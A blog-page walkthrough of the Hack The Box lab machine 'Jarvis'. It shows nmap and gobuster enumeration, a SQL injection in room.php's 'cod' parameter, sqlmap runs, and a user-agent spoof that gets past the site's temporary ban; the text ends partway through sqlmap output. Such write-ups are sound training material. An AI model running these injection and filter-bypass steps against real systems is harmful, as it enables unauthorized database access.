<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Jarvis - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Jarvis from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Jarvis">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/jarvis/">


  <meta property="og:description" content="My write-up / walkthrough for Jarvis from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Jarvis">
  <meta name="twitter:description" content="My write-up / walkthrough for Jarvis from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/jarvis/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-11-09T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/jarvis/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Jarvis">
    <meta itemprop="description" content="Hack The Box - Jarvis">
    <meta itemprop="datePublished" content="2019-11-09T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/jarvis/" class="u-url" itemprop="url">Hack The Box - Jarvis
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-11-09T07:00:00+02:00">November 9, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          21 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---jarvis">Hack The Box - Jarvis</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#web-enumeration">Web Enumeration</a></li>
<li><a href="#sqli-in-roomphp">SQLi in room.php</a></li>
<li>
<a href="#rce--shell-as-www-data">RCE –&gt; Shell as www-data</a><ul>
<li><a href="#first-way">First way:</a></li>
<li><a href="#second-way">Second way:</a></li>
</ul>
</li>
<li><a href="#command-injection-in-simplerpy--shell-as-pepper--user-flag">Command Injection in simpler.py –&gt; Shell as pepper –&gt; User Flag</a></li>
<li><a href="#systemctl-suid--root-shell--root-flag">Systemctl: suid –&gt; Root Shell –&gt; Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---jarvis">Hack The Box - Jarvis</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys, today Jarvis retired and here’s my write-up about it. It was a nice easy box with a web application vulnerable to <code class="language-plaintext highlighter-rouge">SQL</code> injection, a python script vulnerable to command injection and a setuid binary that could be abused to get a root shell. It’s a medium box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.143</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">jarvis.htb</code>. Let’s jump right in!</p>

<p><br><img src="/images/hackthebox/jarvis/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/jarvis# nmap -sV -sT -sC -o nmapinitial jarvis.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-08 17:33 EET
Nmap scan report for jarvis.htb (10.10.10.143)
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.86 seconds
root@kali:~/Desktop/HTB/boxes/jarvis# 
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">ssh</code> on port 22 and <code class="language-plaintext highlighter-rouge">http</code> on port 80. Let’s take a look at the web service.<br></p>

<h2 id="web-enumeration">Web Enumeration</h2>
<p>By visiting <code class="language-plaintext highlighter-rouge">http://jarvis.htb/</code> we get a website for a hotel called Stark Hotel:
<br><img src="/images/hackthebox/jarvis/1.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/jarvis/2.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/jarvis/3.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/jarvis/4.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/jarvis/5.png" alt="" class="align-center"><br><br>
I ran <code class="language-plaintext highlighter-rouge">gobuster</code> to check for any sub directories and the only interesting thing I found was <code class="language-plaintext highlighter-rouge">/phpmyadmin</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/jarvis# gobuster -u http://jarvis.htb/ -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://jarvis.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/11/08 17:38:59 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
=====================================================
2019/11/08 17:40:39 Finished
=====================================================
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">http://jarvis.htb/phpmyadmin</code>
<br><img src="/images/hackthebox/jarvis/6.png" alt="" class="align-center"><br><br></p>

<blockquote>
  <p>phpMyAdmin is a free software tool written in <a href="https://php.net/" target="_blank" rel="noopener noreferrer">PHP</a>, intended to handle the administration of <a href="https://www.mysql.com/" target="_blank" rel="noopener noreferrer">MySQL</a> over the Web. phpMyAdmin supports a wide range of operations on MySQL and MariaDB. Frequently used operations (managing databases, tables, columns, relations, indexes, users, permissions, etc) can be performed via the user interface, while you still have the ability to directly execute any SQL statement. -<a href="https://phpmyadmin.net/" target="_blank" rel="noopener noreferrer">phpmyadmin.net</a></p>
</blockquote>

<p>That can be useful later if we could find the credentials, but for now let’s concentrate on the web application.<br></p>

<h2 id="sqli-in-roomphp">SQLi in room.php</h2>
<p>Back to the “Rooms &amp; Suites” section in the main page, clicking on any of these rooms requests <code class="language-plaintext highlighter-rouge">/room.php</code> with a parameter called <code class="language-plaintext highlighter-rouge">cod</code> that holds the room number:
<br><img src="/images/hackthebox/jarvis/3.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/jarvis/7.png" alt="" class="align-center"><br><br>
I tried replacing the number with a single quote <code class="language-plaintext highlighter-rouge">'</code> and I got a weird response:
<br><img src="/images/hackthebox/jarvis/8.png" alt="" class="align-center"><br><br>
So I ran <code class="language-plaintext highlighter-rouge">sqlmap</code> but I got a 404 response:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">jarvis</span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jarvis</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">room</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">cod</span><span class="o">=</span><span class="mi">1</span>             
        <span class="n">___</span>           
       <span class="n">__H__</span>
 <span class="n">___</span> <span class="n">___</span><span class="p">[(]</span><span class="n">_____</span> <span class="n">___</span> <span class="n">___</span>  <span class="err">{</span><span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span><span class="o">#</span><span class="k">stable</span><span class="err">}</span>
<span class="o">|</span><span class="n">_</span> <span class="o">-|</span> <span class="p">.</span> <span class="p">[)]</span>     <span class="o">|</span> <span class="p">.</span><span class="s1">'| . |
|___|_  [)]_|_|_|__,|  _|                 
      |_|V...       |_|   http://sqlmap.org
      
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span><span class="n">s</span> <span class="n">responsibility</span> <span class="k">to</span> <span class="n">obey</span> <span class="k">all</span> <span class="n">applicable</span> <span class="k">local</span><span class="p">,</span> <span class="k">state</span> <span class="k">and</span> <span class="n">federal</span> <span class="n">laws</span><span class="p">.</span> <span class="n">Developers</span> <span class="n">assume</span> <span class="k">no</span>
 <span class="n">liability</span> <span class="k">and</span> <span class="k">are</span> <span class="k">not</span> <span class="n">responsible</span> <span class="k">for</span> <span class="k">any</span> <span class="n">misuse</span> <span class="k">or</span> <span class="n">damage</span> <span class="n">caused</span> <span class="k">by</span> <span class="n">this</span> <span class="n">program</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">starting</span> <span class="o">@</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">03</span> <span class="o">/</span><span class="mi">2019</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">08</span><span class="o">/</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">03</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="k">connection</span> <span class="k">to</span> <span class="n">the</span> <span class="n">target</span> <span class="n">URL</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">checking</span> <span class="n">if</span> <span class="n">the</span> <span class="n">target</span> <span class="k">is</span> <span class="n">protected</span> <span class="k">by</span> <span class="k">some</span> <span class="n">kind</span> <span class="k">of</span> <span class="n">WAF</span><span class="o">/</span><span class="n">IPS</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="n">if</span> <span class="n">the</span> <span class="n">target</span> <span class="n">URL</span> <span class="n">content</span> <span class="k">is</span> <span class="k">stable</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">heuristics</span> <span class="n">detected</span> <span class="n">web</span> <span class="n">page</span> <span class="n">charset</span> <span class="s1">'ascii'</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">WARNING</span><span class="p">]</span> <span class="n">target</span> <span class="n">URL</span> <span class="n">content</span> <span class="k">is</span> <span class="k">not</span> <span class="k">stable</span> <span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">e</span><span class="p">.</span> <span class="n">content</span> <span class="n">differs</span><span class="p">).</span> <span class="n">sqlmap</span> <span class="n">will</span> <span class="n">base</span> <span class="n">the</span> <span class="n">page</span> <span class="n">comparison</span> <span class="k">on</span> <span class="n">a</span> <span class="n">sequence</span> <span class="n">matcher</span><span class="p">.</span> <span class="n">If</span> <span class="k">no</span> <span class="k">dynamic</span> <span class="n">nor</span> <span class="n">injectable</span> <span class="k">parameters</span> <span class="k">are</span> <span class="n">detected</span><span class="p">,</span> <span class="k">or</span> <span class="k">in</span> <span class="k">case</span> <span class="k">of</span> <span class="n">junk</span> 
<span class="n">results</span><span class="p">,</span> <span class="n">refer</span> <span class="k">to</span> <span class="k">user</span><span class="s1">'s manual paragraph '</span><span class="n">Page</span> <span class="n">comparison</span><span class="s1">'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[17:43:13] [INFO] searching for dynamic content
[17:43:13] [CRITICAL] page not found (404)
[17:43:13] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 2 times
[*] ending @ 17:43:13 /2019-11-08/
</span></code></pre></div></div>
<p>I checked the page again and saw a message indicating that I got banned for 90 seconds:
<br><img src="/images/hackthebox/jarvis/9.png" alt="" class="align-center"><br><br>
I assumed that it checks for the user-agent because the ban happened immediately, so I added the <code class="language-plaintext highlighter-rouge">--user-agent</code> option and used Firefox user-agent, that was enough to bypass the filter:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">jarvis</span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jarvis</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">room</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">cod</span><span class="o">=</span><span class="mi">1</span> <span class="c1">--user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"     </span>
        <span class="n">___</span>           
       <span class="n">__H__</span>
 <span class="n">___</span> <span class="n">___</span><span class="p">[(]</span><span class="n">_____</span> <span class="n">___</span> <span class="n">___</span>  <span class="err">{</span><span class="mi">1</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span><span class="o">#</span><span class="k">stable</span><span class="err">}</span>
<span class="o">|</span><span class="n">_</span> <span class="o">-|</span> <span class="p">.</span> <span class="p">[,]</span>     <span class="o">|</span> <span class="p">.</span><span class="s1">'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org                       
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span><span class="n">s</span> <span class="n">responsibility</span> <span class="k">to</span> <span class="n">obey</span> <span class="k">all</span> <span class="n">applicable</span> <span class="k">local</span><span class="p">,</span> <span class="k">state</span> <span class="k">and</span> <span class="n">federal</span> <span class="n">laws</span><span class="p">.</span> <span class="n">Developers</span> <span class="n">assume</span> <span class="k">no</span>
 <span class="n">liability</span> <span class="k">and</span> <span class="k">are</span> <span class="k">not</span> <span class="n">responsible</span> <span class="k">for</span> <span class="k">any</span> <span class="n">misuse</span> <span class="k">or</span> <span class="n">damage</span> <span class="n">caused</span> <span class="k">by</span> <span class="n">this</span> <span class="n">program</span>
 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">starting</span> <span class="o">@</span> <span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">42</span> <span class="o">/</span><span class="mi">2019</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">08</span><span class="o">/</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">42</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="k">connection</span> <span class="k">to</span> <span class="n">the</span> <span class="n">target</span> <span class="n">URL</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">43</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">checking</span> <span class="n">if</span> <span class="n">the</span> <span class="n">target</span> <span class="k">is</span> <span class="n">protected</span> <span class="k">by</span> <span class="k">some</span> <span class="n">kind</span> <span class="k">of</span> <span class="n">WAF</span><span class="o">/</span><span class="n">IPS</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">43</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="n">if</span> <span class="n">the</span> <span class="n">target</span> <span class="n">URL</span> <span class="n">content</span> <span class="k">is</span> <span class="k">stable</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">target</span> <span class="n">URL</span> <span class="n">content</span> <span class="k">is</span> <span class="k">stable</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="n">if</span> <span class="k">GET</span> <span class="k">parameter</span> <span class="s1">'cod'</span> <span class="k">is</span> <span class="k">dynamic</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="k">GET</span> <span class="k">parameter</span> <span class="s1">'cod'</span> <span class="n">appears</span> <span class="k">to</span> <span class="n">be</span> <span class="k">dynamic</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">heuristic</span> <span class="p">(</span><span class="n">basic</span><span class="p">)</span> <span class="n">test</span> <span class="n">shows</span> <span class="n">that</span> <span class="k">GET</span> <span class="k">parameter</span> <span class="s1">'cod'</span> <span class="n">might</span> <span class="n">be</span> <span class="n">injectable</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="k">for</span> <span class="k">SQL</span> <span class="n">injection</span> <span class="k">on</span> <span class="k">GET</span> <span class="k">parameter</span> <span class="s1">'cod'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'AND boolean-based blind - WHERE or HAVING clause'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="k">GET</span> <span class="k">parameter</span> <span class="s1">'cod'</span> <span class="n">appears</span> <span class="k">to</span> <span class="n">be</span> <span class="s1">'AND boolean-based blind - WHERE or HAVING clause'</span> <span class="n">injectable</span> <span class="p">(</span><span class="k">with</span> <span class="c1">--string="of")</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">52</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">heuristic</span> <span class="p">(</span><span class="n">extended</span><span class="p">)</span> <span class="n">test</span> <span class="n">shows</span> <span class="n">that</span> <span class="n">the</span> <span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span> <span class="n">could</span> <span class="n">be</span> <span class="s1">'MySQL'</span>  
<span class="n">it</span> <span class="n">looks</span> <span class="k">like</span> <span class="n">the</span> <span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span> <span class="k">is</span> <span class="s1">'MySQL'</span><span class="p">.</span> <span class="k">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="k">to</span> <span class="n">skip</span> <span class="n">test</span> <span class="n">payloads</span> <span class="k">specific</span> <span class="k">for</span> <span class="n">other</span> <span class="n">DBMSes</span><span class="o">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="p">]</span> <span class="n">n</span>
<span class="k">for</span> <span class="n">the</span> <span class="n">remaining</span> <span class="n">tests</span><span class="p">,</span> <span class="k">do</span> <span class="n">you</span> <span class="n">want</span> <span class="k">to</span> <span class="n">include</span> <span class="k">all</span> <span class="n">tests</span> <span class="k">for</span> <span class="s1">'MySQL'</span> <span class="n">extending</span> <span class="n">provided</span> <span class="k">level</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="n">risk</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">values</span><span class="o">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="p">]</span> <span class="n">y</span>    
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'</span>             
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'</span>                 
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'</span>
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'</span>  
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'</span>             
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'</span>                     
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>        
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>  
<span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>  
